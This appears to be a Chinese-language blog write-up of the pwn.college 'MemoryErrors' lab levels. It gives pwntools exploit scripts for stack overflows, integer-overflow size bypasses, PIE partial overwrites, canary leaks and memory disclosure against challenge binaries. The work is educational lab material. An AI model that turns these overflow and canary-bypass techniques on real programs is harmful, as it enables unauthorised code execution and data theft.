<!DOCTYPE html>
<html>
  <head>
      <script>
  var _hmt = _hmt || []
  ;(function() {
    var hm = document.createElement('script')
    hm.src = 'https://hm.baidu.com/hm.js?5a0acc897fd96474a2c8f4deac84611a'
    var s = document.getElementsByTagName('script')[0]
    s.parentNode.insertBefore(hm, s)
  })()
</script> 
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="keywords" content="" />
    <meta name="description" content="" />
    
    <title>
      MemoryErrors - Rin
    </title>
    <link rel="manifest" href="/manifest.json" />
    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
    
<link rel="stylesheet" href="../../../../style/style.css">

  <meta name="generator" content="Hexo 5.4.0"></head>
  <body>
    <canvas id='pagemap'></canvas>
    
    <div id="post-toc" class="animated hiddenToc hide">
      <span class="title">Toc</span>
      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Level1-0"><span class="toc-text">Level1.0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level1-1"><span class="toc-text">Level1.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level2-0"><span class="toc-text">Level2..0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level2-1"><span class="toc-text">level2.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level3-0"><span class="toc-text">Level3.0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level3-1"><span class="toc-text">Level3.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level4-0"><span class="toc-text">Level4.0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level4-1"><span class="toc-text">Level4.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level5-0"><span class="toc-text">Level5.0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level5-1"><span class="toc-text">Level5.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level6-0"><span class="toc-text">Level6.0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level6-1"><span class="toc-text">Level6.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level7-0"><span class="toc-text">Level7.0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level7-1"><span class="toc-text">Level7.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level8-0"><span class="toc-text">Level8.0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level8-1"><span class="toc-text">Level8.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level9-0"><span class="toc-text">Level9.0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level9-1"><span class="toc-text">Level9.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level10-0"><span class="toc-text">Level10.0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level10-1"><span class="toc-text">Level10.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level11-0"><span class="toc-text">Level11.0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level11-1"><span class="toc-text">level11.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level12-0"><span class="toc-text">level12.0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level12-1"><span class="toc-text">Level12.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level13-0"><span class="toc-text">level13.0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level13-1"><span class="toc-text">level13.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level14"><span class="toc-text">level14</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#level15-0"><span class="toc-text">level15.0</span></a></li></ol>
    </div>
    
    <div id="fixed-menu-wrap">
      <span class="iconfont icon-sousuo search-box menu-reset"></span>
      <span class="icon-toc menu-reset">Toc</span>
      <span class="iconfont icon-arrowup menu-reset"></span>
    </div>
    <div id="fixed-menu">
      <span class="iconfont icon-menu-"></span>
    </div>
    <div id="progress">
      <div class="line"></div>
    </div>
    <div id="search-shade" class="animated hiddenSearch hide">
      <div class="input-wrap">
        <span class="iconfont icon-sousuo search-box"></span>
        <input type="text" placeholder="Search" />
        <span class="iconfont icon-close"></span>
      </div>
      <div class="search-result">
        <div class="meta">
          <span><b id="result-count">0</b> results found</span>
          <img src="/images/logo.jpeg" />
        </div>
        <ul id="result-box"></ul>
      </div>
    </div>
    <div id="menu-mask" class="animated hideMenuMask hide">
      <span class="iconfont icon-close"></span>
      <div class="nav">
        
        <a href="../../../../index.html" class="">
          Notes
        </a>
        
        <a href="../../../../friends" class="">
          Friends
        </a>
        
        <a href="../../../../about" class="">
          About
        </a>
        
      </div>
    </div>
    <div id="header">
      <div class="intro">
        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
        <div class="author"></div>
      </div>
      <div class="nav">
        <span class="iconfont icon-menu menu-icon"></span>
        <a href="#" class="search-box">
          <span class="iconfont icon-sousuo"></span>
        </a>
      </div>
    </div>
    <div id="side" class="animated bounceInLeft">
      <div class="shrink">
        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
        <span class="iconfont icon-menu toggle-icon"></span>
        <a href="#" class="search-box">
          <span class="iconfont icon-sousuo"></span>
        </a>
      </div>
      <div class="magnify">
        <div class="about">
          <div class="author"></div>
          <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
        </div>

        <div class="nav">
          
          <a href="../../../../index.html" class="">
            Notes
          </a>
          
          <a href="../../../../friends" class="">
            Friends
          </a>
          
          <a href="../../../../about" class="">
            About
          </a>
          
          <a href="#" class="search-box">
            <span class="iconfont icon-sousuo"></span>
          </a>
        </div>
        <div class="bottom">
          <div class="follow">
             
            <a href="/atom.xml" target="_block">
              <span class="iconfont icon-rss"></span>
            </a>
            
          </div>
        </div>
      </div>
    </div>
    <div id="container">
      <div class="main animated bounceInRight delay-0.7s">
        <article class="post-entry">
    <div class="header">
      
      <div class="title">MemoryErrors</div>
      <div class="meta">
        <span class="item">
          <span class="iconfont icon-time-circle"></span>
          <span>2022/03/03</span>
        </span>

        

        
        
         
          <span class="item">
            <span class="iconfont icon-tag1"></span>
            <span>
                
                  
                    <a href="/tags/pwncollege">pwncollege</a>
                  
                
            </span>
          </span>
         
      </div>
      <div>
      </div>
    </div>
    <html><head></head><body><p>​        视频主要介绍了栈溢出及其保护。保护的绕过包括canary和pie，并没有提到NX（那个似乎在后面一个module）</p>
<p>​        传输题目到本地可以使用<code>scp</code>命令。</p>
<pre><code class="bash">scp -i key -r hacker@dojo.pwn.college:/challenge/babymem_level4.1 /Users/rin/ctf/pwn/pwn_college/MemoryErrors
</code></pre>
<h4 id="Level1-0">Level1.0<a class="post-anchor" href="#Level1-0"></a></h4><p>​        随便溢，覆盖掉变量就行。</p>
<h4 id="Level1-1">Level1.1<a class="post-anchor" href="#Level1-1"></a></h4><p>​        随便溢。</p>
<h4 id="Level2-0">Level2..0<a class="post-anchor" href="#Level2-0"></a></h4><p>​        随便溢。</p>
<h4 id="level2-1">level2.1<a class="post-anchor" href="#level2-1"></a></h4><p>​        这道题理论上也是需要溢出到v9，但是很奇怪。多试几次会发现溢出得足够大的时候就会有flag了，这里溢出0x1000个就行。</p>
<p>​        关于为什么要溢出那么多：我找了很久也没有找到第二次输入的时候缓冲区的地址，大概是利用到了堆内存。</p>
<h4 id="Level3-0">Level3.0<a class="post-anchor" href="#Level3-0"></a></h4><p>​        没啥好说的。</p>
<pre><code class="python">from pwn import*

p = process("/challenge/babymem_level3.0")

win_addr = 0x4019fa
payload = "a"*152 + p64(win_addr)

p.recvuntil("Payload size:")
p.sendline("160")
p.recvuntil("!")
p.sendline(payload)
p.recv()

p.interactive()
</code></pre>
<p>​        </p>
<h4 id="Level3-1">Level3.1<a class="post-anchor" href="#Level3-1"></a></h4><pre><code class="python">from pwn import*

#context.terminal = ['tmux','splitw','-h']
context.log_level = "debug"
#p = process("./babymem_level3.1")
p = process("/challenge/babymem_level3.1")


win_addr = 0x401D35
payload = b"a"*105 + p64(win_addr)


p.send(b"115")
#gdb.attach(p)

p.send(payload)

p.interactive()
</code></pre>
<p>​            </p>
<p>为什么偏移量这么难找。</p>
<h4 id="Level4-0">Level4.0<a class="post-anchor" href="#Level4-0"></a></h4><p>​        这个题也是蛮灵性的，只能最多输入18个字符但是溢出量是40。</p>
<p>​        注意到实际上程序对于第一次输入的size是没有很严格检测的，所以我们可以输入任意小于18的数字，比如负数。并且负责控制输入size的实际上是一个无符号整数。</p>
<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-05%20%E4%B8%8A%E5%8D%8810.16.03.png" data-caption="截屏2022-03-05 上午10.16.03" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-05%20%E4%B8%8A%E5%8D%8810.16.03.png" alt="截屏2022-03-05 上午10.16.03"></a></p>
<p>对于int型的负数强制类型转换，使得实际能输入的size变得非常大。所以这里其实相当于构建了一个整数溢出，然后绕过了size后面就比较常规了。</p>
<pre><code class="python">from pwn import*

#context.terminal = ['tmux','splitw','-h']
#context.log_level = "debug"
#p = process("./babymem_level4.0")
p = process("/challenge/babymem_level4.0")

#pad = 0x401B5 #0x30
win_addr = 0x401B88
payload = b"a"*40+ p64(win_addr)

p.sendline(b"-999")
#gdb.attach(p)
p.send(payload)

p.interactive()
</code></pre>
<p>​        </p>
<h4 id="Level4-1">Level4.1<a class="post-anchor" href="#Level4-1"></a></h4><p>​        漏洞点：</p>
<pre><code class="c">if ( (signed int)v5 &gt; 30 )
</code></pre>
<p>​        依然是利用强制类型转换将本来是uint的v5变成int来与30比较，形成整数溢出。</p>
<pre><code class="python">from pwn import*

#context.terminal = ['tmux','splitw','-h']
#context.log_level = "debug"
#p = process("./babymem_level4.1")
p = process("/challenge/babymem_level4.1")

#pad = 0x401B5 #0x30
win_addr = 0x4016A3
payload = b"a"*56+ p64(win_addr)

p.sendline(b"-999")
#gdb.attach(p)
p.send(payload)

p.interactive()
</code></pre>
<h4 id="Level5-0">Level5.0<a class="post-anchor" href="#Level5-0"></a></h4><p>​        这个题依然是在输入size的地方进行了一定的检测，这里是</p>
<pre><code class="c">if ( v31 * v32 &gt; 7 )
    sub_401150("record_size * record_num &lt; (unsigned int) sizeof(input)", "&lt;stdin&gt;", 143LL, "challenge");
</code></pre>
<p>​    </p>
<p>​        然后虽然可以输入负数，但是如果随便输的话会导致溢出到下一个payload的read的buffer，导致输入不了，程序直接爆炸。真的非常逆天。        </p>
<p>​        4294967297是1，</p>
<p>​        18446744073709551617</p>
<p>2147483649</p>
<p>​        去找了一下官方的teaching，发现思路其实并不是uint与int之间的强制类型转换，而是uint32和uint64之间强制类型转换导致的溢出。除了最后的size计算时，将v33转化成uint64，其他的变量都是uint32，<a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%884.15.22.png" data-caption="截屏2022-03-07 下午4.15.22" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%884.15.22.png" alt="截屏2022-03-07 下午4.15.22"></a></p>
<pre><code class="python">from pwn import*

p = process("/challenge/babymem_level5.0")


win = 0x4022E7
#payload = b'a'*40+b"\x48"+ b"a"*2
payload =  b'a'*136 + p64(win)
#80+8 canary:16
p.sendline(b"2147483649")
p.sendline(b"2")

p.send(payload)

p.interactive()

</code></pre>
<h4 id="Level5-1">Level5.1<a class="post-anchor" href="#Level5-1"></a></h4><pre><code class="python">from pwn import*

p = process("/challenge/babymem_level5.1")


win = 0x40173B
#payload = b'a'*40+b"\x48"+ b"a"*2
payload =  b'a'*88 + p64(win)
#80+8 canary:16
p.sendline(b"2147483649")
p.sendline(b"2")

p.send(payload)

p.interactive()
</code></pre>
<h4 id="Level6-0">Level6.0<a class="post-anchor" href="#Level6-0"></a></h4><p>​        利用gadget的思想，直接将地址填成flag，而绕过win的检测。</p>
<pre><code class="python">from pwn import*

#context.terminal = ['tmux','splitw','-h']
#context.log_level = "debug"

#p = process("./babymem_level5.0")
p = process("/challenge/babymem_level6.0")
#gdb.attach(p)
#pad = 0x401B5 #0x30
win_addr = 0x401693
payload = b"a"*152+ p64(win_addr)


p.sendline("160")
p.recv()
p.send(payload)

p.interactive()
</code></pre>
<h4 id="Level6-1">Level6.1<a class="post-anchor" href="#Level6-1"></a></h4><p>​        同理。</p>
<pre><code class="python">from pwn import*

context.terminal = ['tmux','splitw','-h']
context.log_level = "debug"

p = process("./babymem_level6.1")
#p = process("/challenge/babymem_level6.1")
gdb.attach(p)
#pad = 0x401B5 #0x30
win_addr = 0x4013BA
payload = b"a"*152+ p64(win_addr)


p.sendline("160")
p.recv()

p.send(payload)

p.interactive()
</code></pre>
<h4 id="Level7-0">Level7.0<a class="post-anchor" href="#Level7-0"></a></h4><p>​        开始考pie的绕过了，不走寻常路啊。</p>
<p>​        之前讲到pie的绕过，一般是部分覆写，以及脚本爆破。</p>
<p>​        地址的后三个字符永远一致，所以只需爆破第四位，就能将<code>retn</code>覆盖成<code>win</code>    。</p>
<p>​        （话说如此我其实从来没有写过爆破pie的脚本。。。。所以说为什么不走寻常路，别的题一般都是五花八门的glibc或者漏洞点，然后用pie增加难度。没有pie做不出来，有pie更加做不出来了，然而这个题目就纯纯地考pie，真的牛）</p>
<pre><code class="python">from pwn import*

#context.terminal = ['tmux','splitw','-h']
#context.log_level = "debug"

#p = process("./babymem_level7.0")
p = process("/challenge/babymem_level7.0")
#gdb.attach(p)
#pad = 0x401B5 #0x30
payload = b"a"*136+ b"\xf4\xbb"


p.sendline("144")
p.recv()

p.send(payload)

p.interactive()
</code></pre>
<p>多执行，总会爆出来的，不过爆之前先在本地调一调，不然有什么错的地方就冤大头了。</p>
<h4 id="Level7-1">Level7.1<a class="post-anchor" href="#Level7-1"></a></h4><pre><code class="python">from pwn import*

#context.terminal = ['tmux','splitw','-h']
#context.log_level = "debug"

#p = process("./babymem_level7.1")
p = process("/challenge/babymem_level8.0")

#pad = 0x401B5 #0x30
payload = b"a"*152+ b"\xa4\xb0"


p.sendline("160")
p.recv()
#gdb.attach(p)
p.send(payload)

p.interactive()
</code></pre>
<p>​                </p>
<h4 id="Level8-0">Level8.0<a class="post-anchor" href="#Level8-0"></a></h4><p>​        好像是又对输入size做了过滤。所以就用到另外一个trick，就是针对strlen的check可以用空字符绕过。</p>
<pre><code class="python">from pwn import*


#context.terminal = ['tmux','splitw','-h']
#context.log_level = "debug"

#p = process("./babymem_level8.0")
p = process("/challenge/babymem_level8.0")


payload = b'\x00'*152 + b"\xa4\xb0"
p.sendline("160")
p.recv()

p.send(payload)


p.interactive()
</code></pre>
<p>​        </p>
<h4 id="Level8-1">Level8.1<a class="post-anchor" href="#Level8-1"></a></h4><p>​        同理</p>
<pre><code class="python">from pwn import*

context.terminal = ['tmux','splitw','-h']
context.log_level = "debug"

p = process("./babymem_level8.1")
#p = process("/challenge/babymem_level8.1")

payload = b'\x00'*104 + b"\x7e\x79"
p.sendline("112")
p.recv()
gdb.attach(p)
p.send(payload)

p.interactive()

</code></pre>
<h4 id="Level9-0">Level9.0<a class="post-anchor" href="#Level9-0"></a></h4><p>​        以程序构造出的漏洞将输入写在canary后。这里需要写104个padding，同时72个padding加上<code>\x60</code>直接绕到canary后覆写。</p>
<pre><code class="python">from pwn import*

p = process("/challenge/babymem_level9.1")

payload = b'a'*72+b"\x60"+ b"\xbe\xc5"*6

p.sendline("106")
p.recv()

p.send(payload)
p.interactive()

</code></pre>
<h4 id="Level9-1">Level9.1<a class="post-anchor" href="#Level9-1"></a></h4><p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-06%20%E4%B8%8B%E5%8D%889.00.44.png" data-caption="截屏2022-03-06 下午9.00.44" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-06%20%E4%B8%8B%E5%8D%889.00.44.png" alt="截屏2022-03-06 下午9.00.44"></a>        </p>
<pre><code class="python">from pwn import*

p = process("/challenge/babymem_level9.1")

payload = b'a'*40+b"\x47"+ b"\x26\x46"

p.sendline("77")
p.recv()

p.send(payload)

p.interactive()
</code></pre>
<p>​        n的数量和size都需要精准控制才能拿flag。</p>
<h4 id="Level10-0">Level10.0<a class="post-anchor" href="#Level10-0"></a></h4><p>​        其实虽然盯着伪代码盯了很久但是感觉并没有实际理解这道题。目前我的疑惑有二：</p>
<ol>
<li>为什么flag被load进了内存，并且也给出了它在栈中实际的地址，但是栈上对应的地址显示的是0.</li>
<li>这道题的思路应该是通过后面那个you say来打印flag，但是如何将payload的指针覆盖为flag的指针？    </li>
</ol>
<p>​    </p>
<p>​        解答一下，第一个问题其实很不应该，显示为0就是因为没有权限。然后第二个问题，覆盖payload指针的思路至少不应该在这个module出现，这道题的漏洞点就是payload的区域和flag的区域在栈上是连续的，只要覆盖掉截断payload的输出的空字符就可以一直输出栈上的内容，包括flag。</p>
<p>​        ps，包括其他题也是，如果有疑惑其实可以找一下官方的teaching视频（但是也有很多没有就是了）</p>
<p>​        </p>
<pre><code class="python">from pwn import*


p = process("/challenge/babymem_level10.0")

payload =  b'a'*111

p.sendline(b"150")


p.send(payload)
</code></pre>
<h4 id="Level10-1">Level10.1<a class="post-anchor" href="#Level10-1"></a></h4><p>​        同</p>
<pre><code class="python">from pwn import*

p = process("/challenge/babymem_level10.1")

payload =  b'a'*79

p.sendline(b"150")
p.send(payload)


p.interactive()

</code></pre>
<h4 id="Level11-0">Level11.0<a class="post-anchor" href="#Level11-0"></a></h4><p>​        也是类似的思路，但是这里倒不是栈地址了，不过区别不大，只是输入的payload大些。</p>
<pre><code class="python">from pwn import*

p = process("/challenge/babymem_level11.0")
#payload = b'a'*40+b"\x48"+ b"a"*2
payload =  b'a'*24577

p.sendline(b"24600")
p.send(payload)

p.interactive()
</code></pre>
<h4 id="level11-1">level11.1<a class="post-anchor" href="#level11-1"></a></h4><p>​        同理</p>
<p>​    （ps：size是我随便填的。但是也不能太随便，得先<code>vmmap</code>看看flag和input buffer被映射到了哪里）</p>
<pre><code class="python">from pwn import*

p = process("/challenge/babymem_level11.1")

payload =  b'a'*12289

p.sendline(b"12400")
p.send(payload)

p.interactive()

</code></pre>
<h4 id="level12-0">level12.0<a class="post-anchor" href="#level12-0"></a></h4><p>​        这道题的trick就在于可以反复调用函数<code>challenge</code>，每一次调用虽然栈会被clear但是canary不变，从而泄露canary。思路其实比较简单，但是调试有些令人恼火。</p>
<pre><code class="python">from pwn import*

p = process("/challenge/babymem_level12.0")

payload1 =  b'a'*35+b"REPEAT"

p.sendline(b"41")
p.send(payload1)
p.recvuntil('You said:')

canary = u64(p.recv()[41:49])
canary  -= 0x54

payload2 = b'a'*41 + p64(canary) + b'a'*8 + b"\x91\xb0"
p.send('100')
p.send(payload2)

p.interactive()
</code></pre>
<h4 id="Level12-1">Level12.1<a class="post-anchor" href="#Level12-1"></a></h4><p>​    同理，但是需要好好调。 </p>
<pre><code class="python">from pwn import*

context.terminal = ['tmux','splitw','-h']
context.log_level = "debug"

p = process("./babymem_level12.1")

payload1 =  b'a'*83+b"REPEAT"

p.sendline(b"89")
gdb.attach(p)
p.send(payload1)
p.recvuntil('You said:')
canary = u64(p.recv()[89:97])

canary  -= 0x54
print(hex(canary))

payload2 = b'a'*89 + p64(canary) + b'a'*8 + b"\x63\x18"

p.send('112')
p.send(payload2)
pause()

p.interactive()
</code></pre>
<h4 id="level13-0">level13.0<a class="post-anchor" href="#level13-0"></a></h4><p>​        。。输几个a就有flag，具体方法看13.1。</p>
<h4 id="level13-1">level13.1<a class="post-anchor" href="#level13-1"></a></h4><p>​        我觉得是最简单的level了。。</p>
<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8B%E5%8D%882.35.04.png" data-caption="截屏2022-03-10 下午2.35.04" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8B%E5%8D%882.35.04.png" alt="截屏2022-03-10 下午2.35.04"></a></p>
<p>​        找到input buffer和flag间地址的填充量，填大于等于的a就行，数量没有必要精确。这个题脚本都没有写，实在太傻逼了。</p>
<h4 id="level14">level14<a class="post-anchor" href="#level14"></a></h4><p>​        其实我觉得这个题没有写的必要了，纯纯的就是13和12的结合。</p>
<h4 id="level15-0">level15.0<a class="post-anchor" href="#level15-0"></a></h4><p>​        一个奇怪的socket网络通信，我觉得思路是通过fork多个子进程来leak canary，但是由于从来没有接触过，所以先研究一会儿吧。</p>
</body></html>

  
  <div class="post-guide">
    <div class="item left">
        
          <a href="../../10/ROP/">ROP</a>
        
    </div>
    <div class="item right">
        
          <a href="../pwncollege_ProgramMisuse/">ProgramMisuse</a>
        
    </div>
  </div>

  


  <div id="comment"></div>

  
  <!-- Highlight.js -->

<link rel="stylesheet"
href="//highlightjs.org/static/demo/styles/night-owl.css">
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js">
</script>
<script>
hljs.initHighlightingOnLoad();

</script>
</article>
        <footer>
          <div class="copyright">
            ©2022
            <a href="https://fuurinko.github.io">Rin777</a> Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> |
            <a target="_blank" rel="noopener" href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
          </div>
          
        </footer>
      </div>
    </div>
  </body>
  
</html>
<script type="text/javascript">
                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"service_worker\":{\"open\":false}}")
                </script> <script type="text/javascript">window.addEventListener('load', function() {
    
    window.loadJs = function(d, m, a) {
      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
      var b = document.createElement('script')
      b.defer = true
      b.setAttribute('type', 'text/javascript')
      b.setAttribute('charset', 'UTF-8')
      b.setAttribute('async', 'true')
      b.setAttribute('src', d)
      m && b.setAttribute('data-main', '/scripts/app-built')
      if (typeof a === 'function') {
        if (window.attachEvent) {
          b.onreadystatechange = function() {
            var e = b.readyState
            if (e === 'loaded' || e === 'complete') {
              b.onreadystatechange = null
              a()
            }
          }
        } else {
          b.onload = a
        }
      }
      c.appendChild(b)
    }
    window.loadJs && window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {require.config({"paths":{"util":"util","share":"share","search":"search","pagemap":"pagemap.min","registerSW":"registerSW","valine":"cdn/Valine.min","av":["https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min"],"pjax":["https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min"],"jquery":["https://cdn.bootcss.com/jquery/3.4.1/jquery.min"],"confirm":["https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min"],"fancybox":["https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min"],"chart":["https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.bundle.min"]},"map":{"*":{"css":"https://cdn.bootcss.com/require-css/0.1.10/css.min.js"}},"shim":{"fancybox":{"deps":["css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css"]},"confirm":{"deps":["css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css"]},"chart":{"deps":["css!https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.min.css"]}},"waitSeconds":3})})
  })</script>  
